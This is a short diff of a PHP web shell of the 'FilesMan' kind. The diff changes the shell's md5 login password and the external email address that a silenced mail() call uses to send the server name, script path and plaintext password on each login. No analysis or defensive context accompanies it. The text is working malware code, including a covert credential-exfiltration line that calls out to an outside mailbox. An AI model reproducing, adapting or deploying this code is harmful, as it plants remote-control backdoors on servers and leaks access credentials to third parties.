@@ -11,7 +11,7 @@ session_start();
 
 /* Configuration */
 /* Password using md5 hashes */
-$password = "c6bdbba4931c3f9946f1e6a8077e82b6";
+$password = "29c4dc4d36b4ab3e7678b2fee5f9c1fd";
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
@@ -65,7 +65,7 @@ function login_shell()
 if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
     if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-      	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('tampungbosgantz@outlook.com', 'root', $tmp);
+      	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('erwinsyahpane3@gmail.com', 'root', $tmp);
     } else {
         login_shell();
 
